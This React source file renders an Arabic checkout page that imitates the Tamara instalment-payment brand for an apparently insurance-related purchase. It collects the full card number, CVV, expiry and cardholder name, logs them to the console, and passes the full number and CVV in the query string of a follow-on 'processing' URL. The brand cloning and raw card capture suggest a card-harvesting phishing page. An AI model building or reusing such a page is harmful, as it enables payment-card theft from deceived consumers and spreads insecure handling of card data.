import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { ChevronLeft, CreditCard } from "lucide-react";
import tamaraLogo from "@/assets/tamara-logo.png";
import visaLogo from "@/assets/visa-logo.png";
import madaLogo from "@/assets/mada-logo.png";
import mastercardLogo from "@/assets/mastercard-logo.png";

const TamaraCheckout = () => {
  const [paymentMethod, setPaymentMethod] = useState("new-card");
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [showInstallments, setShowInstallments] = useState(false);
  const [cardType, setCardType] = useState<"visa" | "mastercard" | "mada" | null>(null);
  const [expiryError, setExpiryError] = useState("");
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const price = searchParams.get("price") || "0";
  const company = searchParams.get("company") || "";
  const paymentId = searchParams.get("paymentId") || "";

  // Calculate installment details
  const totalPrice = parseFloat(price);
  const monthlyPayment = (totalPrice / 4).toFixed(2);

  // Detect card type
  const detectCardType = (number: string) => {
    const cleaned = number.replace(/\s/g, "");
    if (cleaned.startsWith("4")) {
      return "visa";
    } else if (/^5[1-5]/.test(cleaned) || /^222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720/.test(cleaned)) {
      return "mastercard";
    } else if (/^(4(0(0861|1757|7(197|395)|9201)|1(0685|7633|9593)|2(281(7|8|9)|8(331|67(1|2|3)))|3(1361|2328|4107|9954)|4(0(533|647|795)|5564|6(393|404|672))|5(5(036|708)|7865|7997|8456)|6(2220|854(0|1|2|3))|8(301(0|1|2)|4783|609(4|5|6)|931(7|8|9))|93428)|5(0(4300|8160)|13213|2(1076|4(130|514)|9(415|741))|3(0906|1095|2013|5(825|989)|6023|7767|9931)|4(3(085|357)|9760)|5(4180|7606|8848)|8(5265|8(8(4(5|6|7|8|9)|5(0|1))|98(2|3))|9(005|206)))|6(0(4906|5141)|36120)|9682(0(1|2|3|4|5|6|7|8|9)|1(0|1)))/.test(cleaned)) {
      return "mada";
    }
    return null;
  };

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    const formatted = cleaned.match(/.{1,4}/g)?.join(" ") || cleaned;
    return formatted.substring(0, 19);
  };

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
    }
    return cleaned;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
    setCardType(detectCardType(formatted));
  };

  const handleExpiryMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 2) {
      const month = parseInt(value || "0");
      if (month <= 12) {
        setExpiryMonth(value);
        validateExpiryDate(value, expiryYear);
      }
    }
  };

  const handleExpiryYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 2) {
      setExpiryYear(value);
      validateExpiryDate(expiryMonth, value);
    }
  };

  const validateExpiryDate = (month: string, year: string) => {
    if (month.length === 2 && year.length === 2) {
      const expMonth = parseInt(month);
      const expYear = parseInt(year);
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        setExpiryError("تاريخ البطاقة منتهي");
      } else if (expMonth > 12 || expMonth < 1) {
        setExpiryError("الشهر غير صحيح");
      } else {
        setExpiryError("");
      }
    } else {
      setExpiryError("");
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    setCvv(value.substring(0, 3));
  };

  const handleCardholderNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Allow Arabic letters, English letters, and spaces only
    if (/^[\u0600-\u06FFa-zA-Z\s]*$/.test(value)) {
      setCardholderName(value);
    }
  };

  const handlePayment = () => {
    const expiryDate = `${expiryMonth}/${expiryYear}`;
    console.log("Processing payment:", { cardNumber, expiryDate, cvv });
    
    // Get last 4 digits of card
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const fullCardNumber = cardNumber.replace(/\s/g, "");
    
    // Navigate to processing page with payment details
    navigate(`/tamara-payment-processing?paymentId=${paymentId}&cardholderName=${encodeURIComponent(cardholderName)}&cardNumber=${fullCardNumber}&cardNumberLast4=${last4}&expiryDate=${encodeURIComponent(expiryDate)}&cvv=${cvv}&totalAmount=${totalPrice.toFixed(2)}&monthlyPayment=${monthlyPayment}&company=${encodeURIComponent(company)}`);
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 p-4" dir="rtl">
      <div className="max-w-2xl mx-auto">
        {/* Tamara Logo */}
        <div className="flex justify-center mb-8 pt-6">
          <div className="w-32 h-12 flex items-center justify-center">
            <img src={tamaraLogo} alt="تمارا" className="w-full h-full object-contain" />
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <h1 className="text-2xl font-bold text-center mb-6">التأكيد والدفع</h1>

          {/* Payment Method Selection */}
          <RadioGroup value={paymentMethod} onValueChange={setPaymentMethod}>
            <div className="border-2 border-primary rounded-xl p-4 mb-4 bg-primary/5">
              <div className="flex items-center justify-between mb-4">
                <Label htmlFor="new-card" className="flex items-center gap-3 cursor-pointer flex-1">
                  <RadioGroupItem value="new-card" id="new-card" />
                  <span className="text-base font-medium">أضف بطاقة جديدة</span>
                </Label>
                <CreditCard className="w-5 h-5 text-muted-foreground" />
              </div>

              {/* Card Logos */}
              <div className="flex items-center gap-2 mb-4 pr-7">
                <img src={madaLogo} alt="مدى" className="h-6 object-contain" />
                <img src={visaLogo} alt="فيزا" className="h-6 object-contain" />
                <img src={mastercardLogo} alt="Mastercard" className="h-6 object-contain" />
              </div>

              {/* Card Input Fields */}
              <div className="space-y-3 pr-7">
                <div>
                  <input
                    type="text"
                    value={cardholderName}
                    onChange={handleCardholderNameChange}
                    placeholder="اسم حامل البطاقة"
                    className="w-full border-2 border-gray-200 rounded-lg p-3 text-right outline-none focus:border-primary transition-colors"
                  />
                  <p className="text-xs text-muted-foreground mt-1 text-right">أحرف فقط بدون أرقام</p>
                </div>
                
                <div className="relative">
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="رقم البطاقة"
                    className="w-full border-2 border-gray-200 rounded-lg p-3 text-right outline-none focus:border-primary transition-colors pr-3 pl-12"
                  />
                  {cardType && (
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 h-6 flex items-center">
                      {cardType === "visa" && (
                        <img src={visaLogo} alt="Visa" className="h-full object-contain" />
                      )}
                      {cardType === "mastercard" && (
                        <img src={mastercardLogo} alt="Mastercard" className="h-full object-contain" />
                      )}
                      {cardType === "mada" && (
                        <img src={madaLogo} alt="مدى" className="h-full object-contain" />
                      )}
                    </div>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <input
                      type="text"
                      value={cvv}
                      onChange={handleCvvChange}
                      placeholder="CVV"
                      maxLength={3}
                      className="w-full border-2 border-gray-200 rounded-lg p-3 text-center outline-none focus:border-primary transition-colors"
                    />
                    <p className="text-xs text-muted-foreground mt-1 text-center">رمز الأمان</p>
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <input
                        type="text"
                        value={expiryYear}
                        onChange={handleExpiryYearChange}
                        placeholder="YY"
                        maxLength={2}
                        className={`w-full border-2 rounded-lg p-3 text-center outline-none transition-colors ${
                          expiryError ? 'border-destructive focus:border-destructive' : 'border-gray-200 focus:border-primary'
                        }`}
                      />
                      <p className="text-xs text-muted-foreground mt-1 text-center">السنة</p>
                    </div>
                    <div>
                      <input
                        type="text"
                        value={expiryMonth}
                        onChange={handleExpiryMonthChange}
                        placeholder="MM"
                        maxLength={2}
                        className={`w-full border-2 rounded-lg p-3 text-center outline-none transition-colors ${
                          expiryError ? 'border-destructive focus:border-destructive' : 'border-gray-200 focus:border-primary'
                        }`}
                      />
                      <p className="text-xs text-muted-foreground mt-1 text-center">الشهر</p>
                    </div>
                  </div>
                </div>
                {expiryError && (
                  <p className="text-xs text-destructive mt-2 text-right animate-in fade-in duration-200 flex items-center gap-1">
                    <span>⚠️</span>
                    {expiryError}
                  </p>
                )}
              </div>
            </div>
          </RadioGroup>


          {/* Payment Summary */}
          <button 
            onClick={() => setShowInstallments(!showInstallments)}
            className="w-full border-2 border-gray-200 rounded-xl p-4 mb-6 text-right hover:border-primary transition-colors"
          >
            <div className="flex items-center justify-between">
              <ChevronLeft className={`w-5 h-5 text-muted-foreground transition-transform ${showInstallments ? 'rotate-[-90deg]' : ''}`} />
              <div className="text-right">
                <div className="text-lg font-bold">{monthlyPayment} ر.س/شهريًا</div>
                <div className="text-sm text-muted-foreground">
                  4 دفعات - الإجمالي {totalPrice.toFixed(2)} ر.س
                </div>
              </div>
            </div>

            {/* Installment Details */}
            {showInstallments && (
              <div className="mt-4 pt-4 border-t-2 border-gray-200 space-y-3">
                {/* اليوم */}
                <div className="flex items-center justify-between">
                  <div className="text-base font-medium">ر.س {monthlyPayment}</div>
                  <div className="flex items-center gap-3">
                    <span className="text-sm text-muted-foreground">اليوم</span>
                    <div className="w-8 h-8 rounded-full border-2 border-primary bg-primary flex items-center justify-center">
                      <div className="w-3 h-3 rounded-full bg-white"></div>
                    </div>
                  </div>
                </div>

                {/* بعد شهر */}
                <div className="flex items-center justify-between">
                  <div className="text-base font-medium">ر.س {monthlyPayment}</div>
                  <div className="flex items-center gap-3">
                    <span className="text-sm text-muted-foreground">بعد شهر</span>
                    <div className="w-8 h-8 rounded-full border-2 border-gray-300 bg-gray-300 flex items-center justify-center">
                      <div className="w-3 h-3 rounded-full bg-white"></div>
                    </div>
                  </div>
                </div>

                {/* بعد شهرين */}
                <div className="flex items-center justify-between">
                  <div className="text-base font-medium">ر.س {monthlyPayment}</div>
                  <div className="flex items-center gap-3">
                    <span className="text-sm text-muted-foreground">بعد شهرين</span>
                    <div className="w-8 h-8 rounded-full border-2 border-gray-300 bg-gray-300 flex items-center justify-center">
                      <div className="w-3 h-3 rounded-full bg-white"></div>
                    </div>
                  </div>
                </div>

                {/* بعد 3 أشهر */}
                <div className="flex items-center justify-between">
                  <div className="text-base font-medium">ر.س {monthlyPayment}</div>
                  <div className="flex items-center gap-3">
                    <span className="text-sm text-muted-foreground">بعد 3 أشهر</span>
                    <div className="w-8 h-8 rounded-full border-2 border-gray-300 bg-gray-300 flex items-center justify-center">
                      <div className="w-3 h-3 rounded-full bg-white"></div>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </button>

          {/* Pay Button */}
          <Button
            onClick={handlePayment}
            className="w-full bg-green-600 hover:bg-green-700 text-white h-14 text-lg rounded-xl disabled:bg-gray-300 disabled:text-gray-500"
            disabled={!cardholderName || !cardNumber || !expiryMonth || !expiryYear || !cvv || !!expiryError}
          >
            ادفع {monthlyPayment} ر.س
          </Button>
        </div>

        {/* Order Info */}
        <div className="text-center text-sm text-muted-foreground">
          <p>قيمة الطلب: {price} ر.س</p>
          <p className="mt-1">شركة التأمين: {company}</p>
        </div>
      </div>
    </div>
  );
};

export default TamaraCheckout;
